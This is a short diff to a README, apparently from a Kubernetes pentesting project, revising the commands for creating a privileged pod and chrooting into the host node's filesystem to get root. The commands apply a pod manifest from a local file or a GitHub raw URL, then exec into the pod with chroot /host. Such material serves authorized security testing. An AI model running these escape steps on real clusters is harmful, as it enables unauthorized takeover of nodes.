@@ -40,10 +40,13 @@ If there are no pod admission controllers applied,or a really lax policy, you ca
 [pod-chroot-node.yaml](yaml/pod-chroot-node.yaml)
 
 ```bash
-# Create pod
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-chroot-node.yaml [-n namespace]
+# Option 1: Create pod from local yaml 
+kubectl apply -f pod-chroot-node.yaml [-n namespace] 
+# Option 2: Create pod from github hosted yaml
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-chroot-node.yaml [-n namespace] 
+
 # Exec into pod 
-kubectl -n [namespace] exec -it bf-hostpid -- chroot /host
+kubectl -n [namespace] exec -it pod-chroot-node -- chroot /host
 # Do stuff in pod
 # You now have full root access to the pod
 ```
